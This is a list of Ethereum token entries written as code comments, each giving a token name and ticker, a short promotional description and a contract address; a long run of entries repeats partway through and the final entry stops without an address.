// WePower (WPR)
// Blockchain Green energy trading platform
// 0x4CF488387F035FF08c371515562CBa712f9015d4


// Monetha (MTH)
// Trusted ecommerce.
// 0xaf4dce16da2877f8c9e00544c93b62ac40631f16


// BitSpawn Token (SPWN)
// Bitspawn is a gaming blockchain protocol aiming to give gamers new revenue streams.
// 0xe516d78d784c77d479977be58905b3f2b1111126

// NEXT (NEXT)
// A hybrid exchange registered as an N. V. (Public company) in the Netherlands and provides fiat pairs to all altcoins on its platform
// 0x377d552914e7a104bc22b4f3b6268ddc69615be7

// UREEQA Token (URQA)
// UREEQA is a platform for Protecting, Managing and Monetizing creative work.
// 0x1735db6ab5baa19ea55d0adceed7bcdc008b3136


// Eden Coin (EDN)
// EdenChain is a blockchain platform that allows for the capitalization of any and every tangible and intangible asset such as stocks, bonds, real estate, and commodities amongst many others.
// 0x89020f0D5C5AF4f3407Eb5Fe185416c457B0e93e
	

// PieDAO DOUGH v2 (DOUGH)
// DOUGH is the PieDAO governance token. Owning DOUGH makes you a member of PieDAO. Holders are capable of participating in the DAO’s governance votes and proposing votes of their own.
// 0xad32A8e6220741182940c5aBF610bDE99E737b2D
	

// cVToken (cV)
// Decentralized car history registry built on blockchain.
// 0x50bC2Ecc0bfDf5666640048038C1ABA7B7525683


// CrowdWizToken (WIZ)
// Democratize the investing process by eliminating intermediaries and placing the power and control where it belongs - entirely into the hands of investors.
// 0x2f9b6779c37df5707249eeb3734bbfc94763fbe2


// Aluna (ALN)
// Aluna.Social is a gamified social trading terminal able to manage multiple exchange accounts, featuring a transparent social environment to learn from experts and even mirror trades. Aluna's vision is to gamify finance and create the ultimate social trading experience for a Web 3.0 world.
// 0x8185bc4757572da2a610f887561c32298f1a5748


// Gas DAO (GAS)
// Gas DAO’s purpose is simple: to be the heartbeat and voice of the Ethereum network’s active users through on and off-chain governance, launched as a decentralized autonomous organization with a free and fair initial distribution 100x bigger than the original DAO.
// 0x6bba316c48b49bd1eac44573c5c871ff02958469
	

// Hiveterminal Token (HVN)
// A blockchain based platform providing you fast and low-cost liquidity.
// 0xC0Eb85285d83217CD7c891702bcbC0FC401E2D9D


// EXRP Network (EXRN)
// Connecting the blockchains using crosschain gateway built with smart contracts.
// 0xe469c4473af82217b30cf17b10bcdb6c8c796e75

// Neumark (NEU)
// Neufund’s Equity Token Offerings (ETOs) open the possibility to fundraise on Blockchain, with legal and technical framework done for you.
// 0xa823e6722006afe99e91c30ff5295052fe6b8e32


// Bloom (BLT)
// Decentralized credit scoring powered by Ethereum and IPFS.
// 0x107c4504cd79c5d2696ea0030a8dd4e92601b82e


// IONChain Token (IONC)
// Through IONChain Protocol, IONChain will serve as the link between IoT devices, supporting decentralized peer-to-peer application interaction between devices.
// 0xbc647aad10114b89564c0a7aabe542bd0cf2c5af


// Voice Token (VOICE)
// Voice is the governance token of Mute.io that makes cryptocurrency and DeFi trading more accessible to the masses.
// 0x2e2364966267B5D7D2cE6CD9A9B5bD19d9C7C6A9


// Snetwork (SNET)
// Distributed Shared Cloud Computing Network
// 0xff19138b039d938db46bdda0067dc4ba132ec71c


// AMLT (AMLT)
// The Coinfirm AMLT token solves AML/CTF needs for cryptocurrency and blockchain-related companies and allows for the safe adoption of cryptocurrencies and blockchain by players in the traditional economy.
// 0xca0e7269600d353f70b14ad118a49575455c0f2f


// LibraToken (LBA)
// Decentralized lending infrastructure facilitating open access to credit networks on Ethereum.
// 0xfe5f141bf94fe84bc28ded0ab966c16b17490657


// GAT (GAT)
// GATCOIN aims to transform traditional discount coupons, loyalty points and shopping vouchers into liquid, tradable digital tokens.
// 0x687174f8c49ceb7729d925c3a961507ea4ac7b28


// Tadpole (TAD)
// Tadpole Finance is an open-source platform providing decentralized finance services for saving and lending. Tadpole Finance is an experimental project to create a more open lending market, where users can make deposits and loans with any ERC20 tokens on the Ethereum network.
// 0x9f7229aF0c4b9740e207Ea283b9094983f78ba04


// Hacken (HKN)
// Global Tokenized Business with Operating Cybersecurity Products.
// 0x9e6b2b11542f2bc52f3029077ace37e8fd838d7f


// DeFiner (FIN)
// DeFiner is a non-custodial digital asset platform with a true peer-to-peer network for savings, lending, and borrowing all powered by blockchain technology.
// 0x054f76beED60AB6dBEb23502178C52d6C5dEbE40
	

// XIO Network (XIO)
// Blockzero is a decentralized autonomous accelerator that helps blockchain projects reach escape velocity. Users can help build, scale, and own the next generation of decentralized projects at blockzerolabs.io.
// 0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704


// Autonio (NIOX)
// Autonio Foundation is a DAO that develops decentralized and comprehensive financial technology for the crypto economy to make it easier for crypto traders to conduct trading analysis, deploy trading algorithms, copy successful traders and exchange cryptocurrencies.
// 0xc813EA5e3b48BEbeedb796ab42A30C5599b01740


// Hydro Protocol (HOT)
// A network transport layer protocol for hybrid decentralized exchanges.
// 0x9af839687f6c94542ac5ece2e317daae355493a1


// Humaniq (HMQ)
// Humaniq aims to be a simple and secure 4th generation mobile bank.
// 0xcbcc0f036ed4788f63fc0fee32873d6a7487b908


// Signata (SATA)
// The Signata project aims to deliver a full suite of blockchain-powered identity and access control solutions, including hardware token integration and a marketplace of smart contracts for integration with 3rd party service providers.
// 0x3ebb4a4e91ad83be51f8d596533818b246f4bee1


// Mothership (MSP)
// Cryptocurrency exchange built from the ground up to support cryptocurrency traders with fiat pairs.
// 0x68AA3F232dA9bdC2343465545794ef3eEa5209BD
	

// FLIP (FLP)
// FLIP CRYPTO-TOKEN FOR GAMERS FROM GAMING EXPERTS
// 0x3a1bda28adb5b0a812a7cf10a1950c920f79bcd3

// 0xBitcoin Token (0xBTC)
// Pure mined digital currency for Ethereum
// 0xb6ed7644c69416d67b522e20bc294a9a9b405b31

// Ixs Token (IXS)
// IX Swap is the “Uniswap” for security tokens (STO) and tokenized stocks (TSO). IX Swap will be the FIRST platform to provide liquidity pools and automated market making functions for the security token (STO) & tokenized stock industry (TSO).
// 0x73d7c860998ca3c01ce8c808f5577d94d545d1b4

// Shopping.io (SPI)
// Shopping.io is a state of the art platform that unifies all major eCommerce platforms, allowing consumers to enjoy online shopping seamlessly, securely, and cost-effectively.
// 0x9b02dd390a603add5c07f9fd9175b7dabe8d63b7

// SunContract (SNC)
// The SunContract platform aims to empower individuals, with an emphasis on home owners, to freely buy, sell or trade electricity.
// 0xF4134146AF2d511Dd5EA8cDB1C4AC88C57D60404


// Curate (XCUR)
// Curate is a shopping rewards app for rewarding users with free cashback and crypto on all their purchases.
// 0xE1c7E30C42C24582888C758984f6e382096786bd


// CyberMiles (CMT)
// Empowering the Decentralization of Online Marketplaces.
// 0xf85feea2fdd81d51177f6b8f35f0e6734ce45f5f


// PAR Stablecoin (PAR)
// Mimo is a company building DeFi tools in the hope to make blockchain more usable to everyone. They have a lending platform allowing people to borrow PAR and their stable token is algorithmically pegged to the Euro.
// 0x68037790a0229e9ce6eaa8a99ea92964106c4703


// Moeda Loyalty Points (MDA)
// Moeda is a cooperative banking system powered by blockchain, built for everyone.
// 0x51db5ad35c671a87207d88fc11d593ac0c8415bd


// DivergenceProtocol (DIVER)
// A platform for on-chain composable crypto options.
// 0xfb782396c9b20e564a64896181c7ac8d8979d5f4


// Spheroid (SPH)
// Spheroid Universe is a MetaVerse for entertainment, games, advertising, and business in the world of Extended Reality. It operates geo-localized private property on Earth's digital surface (Spaces). The platform’s tech foundation is the Spheroid XR Cloud and the Spheroid Script programming language.
// 0xa0cf46eb152656c7090e769916eb44a138aaa406


// PIKA (PIKA)
// PikaCrypto is an ERC-20 meme token project.
// 0x60f5672a271c7e39e787427a18353ba59a4a3578
	

// Monolith (TKN)
// Non-custodial contract wallet paired with a debit card to spend your ETH & ERC-20 tokens in real life.
// 0xaaaf91d9b90df800df4f55c205fd6989c977e73a


// stakedETH (stETH)
// stakedETH (stETH) from StakeHound is a tokenized representation of ETH staked in Ethereum 2.0 mainnet which allows holders to earn Eth2 staking rewards while participating in the Ethereum DeFi ecosystem. Staking rewards are distributed directly into holders' wallets.
// 0xdfe66b14d37c77f4e9b180ceb433d1b164f0281d


// Salt (SALT)
// SALT lets you leverage your blockchain assets to secure cash loans. We make it easy to get money without having to sell your favorite investment.
// 0x4156D3342D5c385a87D264F90653733592000581


// Tidal Token (TIDAL)
// Tidal is an insurance platform enabling custom pools to cover DeFi protocols.
// 0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7

// Tranche Finance (SLICE)
// Tranche is a decentralized protocol for managing risk. The protocol integrates with any interest accrual token, such as Compound's cTokens and AAVE's aTokens, to create two new interest-bearing instruments, one with a fixed-rate, Tranche A, and one with a variable rate, Tranche B.
// 0x0aee8703d34dd9ae107386d3eff22ae75dd616d1


// BTC 2x Flexible Leverage Index (BTC2x-FLI)
// The WBTC Flexible Leverage Index lets you leverage a collateralized debt position in a safe and efficient way, by abstracting its management into a simple index.
// 0x0b498ff89709d3838a063f1dfa463091f9801c2b


// InnovaMinex (MINX)
// Our ultimate goal is making gold and other precious metals more accessible to all the people through our cryptocurrency, InnovaMinex (MINX).
// 0xae353daeed8dcc7a9a12027f7e070c0a50b7b6a4

// UnmarshalToken (MARSH)
// Unmarshal is the multichain DeFi Data Network. It provides the easiest way to query Blockchain data from Ethereum, Binance Smart Chain, and Polkadot.
// 0x5a666c7d92e5fa7edcb6390e4efd6d0cdd69cf37


// VIB (VIB)
// Viberate is a crowdsourced live music ecosystem and a blockchain-based marketplace, where musicians are matched with booking agencies and event organizers.
// 0x2C974B2d0BA1716E644c1FC59982a89DDD2fF724


// WaBi (WaBi)
// Wabi ecosystem connects Brands and Consumers, enabling an exchange of value. Consumers get Wabi for engaging with Ecosystem and redeem the tokens at a Marketplace for thousands of products.
// 0x286BDA1413a2Df81731D4930ce2F862a35A609fE

// Pinknode Token (PNODE)
// Pinknode empowers developers by providing node-as-a-service solutions, removing an entire layer of inefficiencies and complexities, and accelerating product life cycle.
// 0xaf691508ba57d416f895e32a1616da1024e882d2


// Lambda (LAMB)
// Blockchain based decentralized storage solution
// 0x8971f9fd7196e5cee2c1032b50f656855af7dd26


// ABCC Token (AT)
// A cryptocurrency exchange.
// 0xbf8fb919a8bbf28e590852aef2d284494ebc0657

// UNIC (UNIC)
// Unicly is a permissionless, community-governed protocol to combine, fractionalize, and trade NFTs. Built by NFT collectors and DeFi enthusiasts, the protocol incentivizes NFT liquidity and provides a seamless trading experience for fractionalized NFTs.
// 0x94e0bab2f6ab1f19f4750e42d7349f2740513ad5


// SIRIN (SRN)
// SIRIN LABS’ aims to become the world’s leader in secure open source consumer electronics, bridging the gap between the mass market and the blockchain econom
// 0x68d57c9a1c35f63e2c83ee8e49a64e9d70528d25


// Shirtum (SHI)
// Shirtum is a global ecosystem of experiences designed for fans to dive into the history of sports and interact directly with their favorite athletes, clubs and sports brands.
// 0xad996a45fd2373ed0b10efa4a8ecb9de445a4302


// CREDITS (CS)
// CREDITS is an open blockchain platform with autonomous smart contracts and the internal cryptocurrency. The platform is designed to create services for blockchain systems using self-executing smart contracts and a public data registry.
// 0x46b9ad944d1059450da1163511069c718f699d31
	

// Wrapped ETHO (ETHO)
// Immutable, decentralized, highly redundant storage network. Wide ecosystem providing EVM compatibility, IPFS, and SDK to scale use cases and applications. Strong community and dedicated developer team with passion for utilizing revolutionary technology to support free speech and freedom of data.
// 0x0b5326da634f9270fb84481dd6f94d3dc2ca7096

// OpenANX (OAX)
// Decentralized Exchange.
// 0x701c244b988a513c945973defa05de933b23fe1d


// Woofy (WOOFY)
// Wuff wuff.
// 0xd0660cd418a64a1d44e9214ad8e459324d8157f1


// Jenny Metaverse DAO Token (uJENNY)
// Jenny is the first Metaverse DAO to be built on Unicly. It is building one of the most amazing 1-of-1, collectively owned NFT collections in the world.
// 0xa499648fd0e80fd911972bbeb069e4c20e68bf22

// NapoleonX (NPX)
// The crypto asset manager piloting trading bots.
// 0x28b5e12cce51f15594b0b91d5b5adaa70f684a02


// PoolTogether (POOL)
// PoolTogether is a protocol for no-loss prize games.
// 0x0cec1a9154ff802e7934fc916ed7ca50bde6844e


// UNCL (UNCL)
// UNCL is the liquidity and yield farmable token of the Unicrypt ecosystem.
// 0x2f4eb47A1b1F4488C71fc10e39a4aa56AF33Dd49


// Medical Token Currency (MTC)
// MTC is an utility token that fuels a healthcare platform providing healthcare information to interested parties on a secure blockchain supported environment.
// 0x905e337c6c8645263d3521205aa37bf4d034e745


// TenXPay (PAY)
// TenX connects your blockchain assets for everyday use. TenX’s debit card and banking licence will allow us to be a hub for the blockchain ecosystem to connect for real-world use cases.
// 0xB97048628DB6B661D4C2aA833e95Dbe1A905B280


// Tierion Network Token (TNT)
// Tierion creates software to reduce the cost and complexity of trust. Anchoring data to the blockchain and generating a timestamp proof.
// 0x08f5a9235b08173b7569f83645d2c7fb55e8ccd8


// DOVU (DOV)
// DOVU, partially owned by Jaguar Land Rover, is a tokenized data economy for DeFi carbon offsetting.
// 0xac3211a5025414af2866ff09c23fc18bc97e79b1


// RipioCreditNetwork (RCN)
// Ripio Credit Network is a global credit network based on cosigned smart contracts and blockchain technology that connects lenders and borrowers located anywhere in the world and on any currency
// 0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6


// UseChain Token (USE)
// Mirror Identity Protocol and integrated with multi-level innovations in technology and structure design.
// 0xd9485499499d66b175cf5ed54c0a19f1a6bcb61a


// TaTaTu (TTU)
// Social Entertainment Platform with an integrated rewards programme.
// 0x9cda8a60dd5afa156c95bd974428d91a0812e054


// GoBlank Token (BLANK)
// BlockWallet is a privacy-focused non-custodial crypto wallet. Besides full privacy functionality, BlockWallet comes packed with an array of features that go beyond privacy for a seamless user experience. Reclaim your financial privacy. Get BlockWallet.
	// 0x41a3dba3d677e573636ba691a70ff2d606c29666

// Rapids (RPD)
// Fast and secure payments across social media via blockchain technology
// 0x4bf4f2ea258bf5cb69e9dc0ddb4a7a46a7c10c53


// VeriSafe (VSF)
// VeriSafe aims to be the catalyst for projects, exchanges and communities to collaborate, creating an ecosystem where transparency, accountability, communication, and expertise go hand-in-hand to set a standard in the industry.
// 0xac9ce326e95f51b5005e9fe1dd8085a01f18450c


// TOP Network (TOP)
// TOP Network is a decentralized open communication network that provides cloud communication services on the blockchain.
// 0xdcd85914b8ae28c1e62f1c488e1d968d5aaffe2b
	

// Virtue Player Points (VPP)
// Virtue Poker is a decentralized platform that uses the Ethereum blockchain and P2P networking to provide safe and secure online poker. Virtue Poker also launched Virtue Gaming: a free-to-play play-to-earn platform that is combined with Virtue Poker creating the first legal global player pool.
// 0x5eeaa2dcb23056f4e8654a349e57ebe5e76b5e6e
	

// Edgeless (EDG)
// The Ethereum smart contract-based that offers a 0% house edge and solves the transparency question once and for all.
// 0x08711d3b02c8758f2fb3ab4e80228418a7f8e39c


// Blockchain Certified Data Token (BCDT)
// The Blockchain Certified Data Token is the fuel of the EvidenZ ecosystem, a blockchain-powered certification technology.
// 0xacfa209fb73bf3dd5bbfb1101b9bc999c49062a5


// Airbloc (ABL)
// AIRBLOC is a decentralized personal data protocol where individuals would be able to monetize their data, and advertisers would be able to buy these data to conduct targeted marketing campaigns for higher ROIs.
// 0xf8b358b3397a8ea5464f8cc753645d42e14b79ea

// DAEX Token (DAX)
// DAEX is an open and decentralized clearing and settlement ecosystem for all cryptocurrency exchanges.
// 0x0b4bdc478791897274652dc15ef5c135cae61e60

// Armor (ARMOR)
// Armor is a smart insurance aggregator for DeFi, built on trustless and decentralized financial infrastructure.
// 0x1337def16f9b486faed0293eb623dc8395dfe46a
	

// Spendcoin (SPND)
// Spendcoin powers the Spend.com ecosystem. The Spend Wallet App & Spend Card give our users a multi-currency digital wallet that they can manage or spend from
// 0xddd460bbd9f79847ea08681563e8a9696867210c
	

// Float Protocol: FLOAT (FLOAT)
// FLOAT is a token that is designed to act as a floating stable currency in the protocol.
// 0xb05097849bca421a3f51b249ba6cca4af4b97cb9


// Public Mint (MINT)
// Public Mint offers a fiat-native blockchain platform open for anyone to build fiat-native applications and accept credit cards, ACH, stablecoins, wire transfers and more.
// 0x0cdf9acd87e940837ff21bb40c9fd55f68bba059

// Own (CHX)
// Own (formerly Chainium) is a security token blockchain project focused on revolutionising equity markets.
// 0x1460a58096d80a50a2f1f956dda497611fa4f165


// Cindicator (CND)
// Hybrid Intelligence for effective asset management.
// 0xd4c435f5b09f855c3317c8524cb1f586e42795fa


// ASIA COIN (ASIA)
// Asia Coin(ASIA) is the native token of Asia Exchange and aiming to be widely used in Asian markets among diamond-Gold and crypto dealers. AsiaX is now offering crypto trading combined with 260,000+ loose diamonds stock.
// 0xf519381791c03dd7666c142d4e49fd94d3536011
	

// 1World (1WO)
// 1World is first of its kind media token and new generation Adsense. 1WO is used for increasing user engagement by sharing 10% ads revenue with participants and for buying ads.
// 0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23

// Insights Network (INSTAR)
// The Insights Network’s unique combination of blockchain technology, smart contracts, and secure multiparty computation enables the individual to securely own, manage, and monetize their data.
// 0xc72fe8e3dd5bef0f9f31f259399f301272ef2a2d
	

// Cryptonovae (YAE)
// Cryptonovae is an all-in-one multi-exchange trading ecosystem to manage digital assets across centralized and decentralized exchanges. It aims to provide a sophisticated trading experience through advanced charting features and trade management.
// 0x4ee438be38f8682abb089f2bfea48851c5e71eaf

// CPChain (CPC)
// CPChain is a new distributed infrastructure for next generation Internet of Things (IoT).
// 0xfAE4Ee59CDd86e3Be9e8b90b53AA866327D7c090


// ZAP TOKEN (ZAP)
// Zap project is a suite of tools for creating smart contract oracles and a marketplace to find and subscribe to existing data feeds that have been oraclized
// 0x6781a0f84c7e9e846dcb84a9a5bd49333067b104


// Genaro X (GNX)
// The Genaro Network is the first Turing-complete public blockchain combining peer-to-peer storage with a sustainable consensus mechanism. Genaro's mixed consensus uses SPoR and PoS, ensuring stronger performance and security.
// 0x6ec8a24cabdc339a06a172f8223ea557055adaa5

// PILLAR (PLR)
// A cryptocurrency and token wallet that aims to become the dashboard for its users' digital life.
// 0xe3818504c1b32bf1557b16c238b2e01fd3149c17


// Falcon (FNT)
// Falcon Project it's a DeFi ecosystem which includes two completely interchangeable blockchains - ERC-20 token on the Ethereum and private Falcon blockchain. Falcon Project offers its users the right to choose what suits them best at the moment: speed and convenience or anonymity and privacy.
// 0xdc5864ede28bd4405aa04d93e05a0531797d9d59


// MATRIX AI Network (MAN)
// Aims to be an open source public intelligent blockchain platform
// 0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d


// Genesis Vision (GVT)
// A platform for the private trust management market, built on Blockchain technology and Smart Contracts.
// 0x103c3A209da59d3E7C4A89307e66521e081CFDF0

// CarLive Chain (IOV)
// CarLive Chain is a vertical application of blockchain technology in the field of vehicle networking. It provides services to 1.3 billion vehicle users worldwide and the trillion-dollar-scale automobile consumer market.
// 0x0e69d0a2bbb30abcb7e5cfea0e4fde19c00a8d47


// Pawthereum (PAWTH)
// Pawthereum is a cryptocurrency project with animal welfare charitable fundamentals at its core. It aims to give back to animal shelters and be a digital advocate for animals in need.
// 0xaecc217a749c2405b5ebc9857a16d58bdc1c367f


// Furucombo (COMBO)
// Furucombo is a tool built for end-users to optimize their DeFi strategy simply by drag and drop. It visualizes complex DeFi protocols into cubes. Users setup inputs/outputs and the order of the cubes (a “combo”), then Furucombo bundles all the cubes into one transaction and sends them out.
// 0xffffffff2ba8f66d4e51811c5190992176930278


// Xaurum (Xaurum)
// Xaurum is unit of value on the golden blockchain, it represents an increasing amount of gold and can be exchanged for it by melting
// 0x4DF812F6064def1e5e029f1ca858777CC98D2D81
	

// Plasma (PPAY)
// PPAY is designed as the all-in-one defi service token combining access, rewards, staking and governance functions.
	// 0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2

// Digg (DIGG)
// Digg is an elastic bitcoin-pegged token and governed by BadgerDAO.
// 0x798d1be841a82a273720ce31c822c61a67a601c3


// OriginSport Token (ORS)
// A blockchain based sports betting platform
// 0xeb9a4b185816c354db92db09cc3b50be60b901b6


// WePower (WPR)
// Blockchain Green energy trading platform
// 0x4CF488387F035FF08c371515562CBa712f9015d4


// Monetha (MTH)
// Trusted ecommerce.
// 0xaf4dce16da2877f8c9e00544c93b62ac40631f16


// BitSpawn Token (SPWN)
// Bitspawn is a gaming blockchain protocol aiming to give gamers new revenue streams.
// 0xe516d78d784c77d479977be58905b3f2b1111126

// NEXT (NEXT)
// A hybrid exchange registered as an N. V. (Public company) in the Netherlands and provides fiat pairs to all altcoins on its platform
// 0x377d552914e7a104bc22b4f3b6268ddc69615be7

// UREEQA Token (URQA)
// UREEQA is a platform for Protecting, Managing and Monetizing creative work.
// 0x1735db6ab5baa19ea55d0adceed7bcdc008b3136


// Eden Coin (EDN)
// EdenChain is a blockchain platform that allows for the capitalization of any and every tangible and intangible asset such as stocks, bonds, real estate, and commodities amongst many others.
// 0x89020f0D5C5AF4f3407Eb5Fe185416c457B0e93e
	

// PieDAO DOUGH v2 (DOUGH)
// DOUGH is the PieDAO governance token. Owning DOUGH makes you a member of PieDAO. Holders are capable of participating in the DAO’s governance votes and proposing votes of their own.
// 0xad32A8e6220741182940c5aBF610bDE99E737b2D
	

// cVToken (cV)
// Decentralized car history registry built on blockchain.
// 0x50bC2Ecc0bfDf5666640048038C1ABA7B7525683


// CrowdWizToken (WIZ)
// Democratize the investing process by eliminating intermediaries and placing the power and control where it belongs - entirely into the hands of investors.
// 0x2f9b6779c37df5707249eeb3734bbfc94763fbe2


// Aluna (ALN)
// Aluna.Social is a gamified social trading terminal able to manage multiple exchange accounts, featuring a transparent social environment to learn from experts and even mirror trades. Aluna's vision is to gamify finance and create the ultimate social trading experience for a Web 3.0 world.
// 0x8185bc4757572da2a610f887561c32298f1a5748


// Gas DAO (GAS)
// Gas DAO’s purpose is simple: to be the heartbeat and voice of the Ethereum network’s active users through on and off-chain governance, launched as a decentralized autonomous organization with a free and fair initial distribution 100x bigger than the original DAO.
// 0x6bba316c48b49bd1eac44573c5c871ff02958469
	

// Hiveterminal Token (HVN)
// A blockchain based platform providing you fast and low-cost liquidity.
// 0xC0Eb85285d83217CD7c891702bcbC0FC401E2D9D


// EXRP Network (EXRN)
// Connecting the blockchains using crosschain gateway built with smart contracts.
// 0xe469c4473af82217b30cf17b10bcdb6c8c796e75

// Neumark (NEU)
// Neufund’s Equity Token Offerings (ETOs) open the possibility to fundraise on Blockchain, with legal and technical framework done for you.
// 0xa823e6722006afe99e91c30ff5295052fe6b8e32


// Bloom (BLT)
// Decentralized credit scoring powered by Ethereum and IPFS.
// 0x107c4504cd79c5d2696ea0030a8dd4e92601b82e


// IONChain Token (IONC)
// Through IONChain Protocol, IONChain will serve as the link between IoT devices, supporting decentralized peer-to-peer application interaction between devices.
// 0xbc647aad10114b89564c0a7aabe542bd0cf2c5af


// Voice Token (VOICE)
// Voice is the governance token of Mute.io that makes cryptocurrency and DeFi trading more accessible to the masses.
// 0x2e2364966267B5D7D2cE6CD9A9B5bD19d9C7C6A9


// Snetwork (SNET)
// Distributed Shared Cloud Computing Network
// 0xff19138b039d938db46bdda0067dc4ba132ec71c


// AMLT (AMLT)
// The Coinfirm AMLT token solves AML/CTF needs for cryptocurrency and blockchain-related companies and allows for the safe adoption of cryptocurrencies and blockchain by players in the traditional economy.
// 0xca0e7269600d353f70b14ad118a49575455c0f2f


// LibraToken (LBA)
// Decentralized lending infrastructure facilitating open access to credit networks on Ethereum.
// 0xfe5f141bf94fe84bc28ded0ab966c16b17490657


// GAT (GAT)
// GATCOIN aims to transform traditional discount coupons, loyalty points and shopping vouchers into liquid, tradable digital tokens.
// 0x687174f8c49ceb7729d925c3a961507ea4ac7b28


// Tadpole (TAD)
// Tadpole Finance is an open-source platform providing decentralized finance services for saving and lending. Tadpole Finance is an experimental project to create a more open lending market, where users can make deposits and loans with any ERC20 tokens on the Ethereum network.
// 0x9f7229aF0c4b9740e207Ea283b9094983f78ba04


// Hacken (HKN)
// Global Tokenized Business with Operating Cybersecurity Products.
// 0x9e6b2b11542f2bc52f3029077ace37e8fd838d7f


// DeFiner (FIN)
// DeFiner is a non-custodial digital asset platform with a true peer-to-peer network for savings, lending, and borrowing all powered by blockchain technology.
// 0x054f76beED60AB6dBEb23502178C52d6C5dEbE40
	

// XIO Network (XIO)
// Blockzero is a decentralized autonomous accelerator that helps blockchain projects reach escape velocity. Users can help build, scale, and own the next generation of decentralized projects at blockzerolabs.io.
// 0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704


// Autonio (NIOX)
// Autonio Foundation is a DAO that develops decentralized and comprehensive financial technology for the crypto economy to make it easier for crypto traders to conduct trading analysis, deploy trading algorithms, copy successful traders and exchange cryptocurrencies.
// 0xc813EA5e3b48BEbeedb796ab42A30C5599b01740


// Hydro Protocol (HOT)
// A network transport layer protocol for hybrid decentralized exchanges.
// 0x9af839687f6c94542ac5ece2e317daae355493a1


// Humaniq (HMQ)
// Humaniq aims to be a simple and secure 4th generation mobile bank.
// 0xcbcc0f036ed4788f63fc0fee32873d6a7487b908


// Signata (SATA)
// The Signata project aims to deliver a full suite of blockchain-powered identity and access control solutions, including hardware token integration and a marketplace of smart contracts for integration with 3rd party service providers.
// 0x3ebb4a4e91ad83be51f8d596533818b246f4bee1


// Mothership (MSP)
// Cryptocurrency exchange built from the ground up to support cryptocurrency traders with fiat pairs.
// 0x68AA3F232dA9bdC2343465545794ef3eEa5209BD
	

// FLIP (FLP)
// FLIP CRYPTO-TOKEN FOR GAMERS FROM GAMING EXPERTS
// 0x3a1bda28adb5b0a812a7cf10a1950c920f79bcd3


// Fair Token (FAIR)
// Fair.Game is a fair game platform based on blockchain technology.
// 0x9b20dabcec77f6289113e61893f7beefaeb1990a
	

// OCoin (OCN)
// ODYSSEY’s mission is to build the next-generation decentralized sharing economy & Peer to Peer Ecosystem.
// 0x4092678e4e78230f46a1534c0fbc8fa39780892b


// Zloadr Token (ZDR)
// A fully-transparent crypto due diligence token provides banks, investors and financial institutions with free solid researched information; useful and reliable when providing loans, financial assistance or making investment decisions on crypto-backed properties and assets.
// 0xbdfa65533074b0b23ebc18c7190be79fa74b30c2

// Unimex Network (UMX)
// UniMex is a Uniswap based borrowing platform which facilitates the margin trading of native Uniswap assets.
// 0x10be9a8dae441d276a5027936c3aaded2d82bc15


// Vibe Coin (VIBE)
// Crypto Based Virtual / Augmented Reality Marketplace & Hub.
// 0xe8ff5c9c75deb346acac493c463c8950be03dfba
	

// Gro DAO Token (GRO)
// Gro is a stablecoin yield optimizer that enables leverage and protection through risk tranching. It splits yield and risk into two symbiotic products; Gro Vault and PWRD Stablecoin.
// 0x3ec8798b81485a254928b70cda1cf0a2bb0b74d7


// Zippie (ZIPT)
// Zippie enables your business to send and receive programmable payments with money and other digital assets like airtime, loyalty points, tokens and gift cards.
// 0xedd7c94fd7b4971b916d15067bc454b9e1bad980


// Sharpay (S)
// Sharpay is the share button with blockchain profit
// 0x96b0bf939d9460095c15251f71fda11e41dcbddb


// Bundles (BUND)
// Bundles is a DEFI project that challenges token holders against each other to own the most $BUND.
// 0x8D3E855f3f55109D473735aB76F753218400fe96


// ATN (ATN)
// ATN is a global artificial intelligence API marketplace where developers, technology suppliers and buyers come together to access and develop new and innovative forms of A.I. technology.
// 0x461733c17b0755ca5649b6db08b3e213fcf22546


// Empty Set Dollar (ESD)
// ESD is a stablecoin built to be the reserve currency of decentralized finance.
// 0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723


// renDOGE (renDOGE)
// renDOGE is a one-for-one representation of Dogecoin (DOGE) on Ethereum via RenVM.
// 0x3832d2F059E55934220881F831bE501D180671A7


// BOB Token (BOB)
// Using Blockchain to eliminate review fraud and provide lower pricing in the home repair industry through a decentralized platform.
// 0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134

// Cortex Coin (CTXC)
// Decentralized AI autonomous system.
// 0xea11755ae41d889ceec39a63e6ff75a02bc1c00d

// SpookyToken (BOO)
// SpookySwap is an automated market-making (AMM) decentralized exchange (DEX) for the Fantom Opera network.
// 0x55af5865807b196bd0197e0902746f31fbccfa58

// BZ (BZ)
// Digital asset trading exchanges, providing professional digital asset trading and OTC (Over The Counter) services.
// 0x4375e7ad8a01b8ec3ed041399f62d9cd120e0063

// Adventure Gold (AGLD)
// Adventure Gold is the native ERC-20 token of the Loot non-fungible token (NFT) project. Loot is a text-based, randomized adventure gear generated and stored on-chain, created by social media network Vine co-founder Dom Hofmann.
// 0x32353A6C91143bfd6C7d363B546e62a9A2489A20

// Decentral Games (DG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4b520c812e8430659fc9f12f6d0c39026c83588d

// SENTINEL PROTOCOL (UPP)
// Sentinel Protocol is a blockchain-based threat intelligence platform that defends against hacks, scams, and fraud using crowdsourced threat data collected by security experts; called the Sentinels.
// 0xc86d054809623432210c107af2e3f619dcfbf652

// MATH Token (MATH)
// Crypto wallet.
// 0x08d967bb0134f2d07f7cfb6e246680c53927dd30

// SelfKey (KEY)
// SelfKey is a blockchain based self-sovereign identity ecosystem that aims to empower individuals and companies to find more freedom, privacy and wealth through the full ownership of their digital identity.
// 0x4cc19356f2d37338b9802aa8e8fc58b0373296e7

// RHOC (RHOC)
// The RChain Platform aims to be a decentralized, economically sustainable public compute infrastructure.
// 0x168296bb09e24a88805cb9c33356536b980d3fc5

// THORSwap Token (THOR)
// THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
// 0xa5f2211b9b8170f694421f2046281775e8468044

// Somnium Space Cubes (CUBE)
// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
// 0xdf801468a808a32656d2ed2d2d80b72a129739f4

// Parsiq Token (PRQ)
// A Blockchain monitoring and compliance platform.
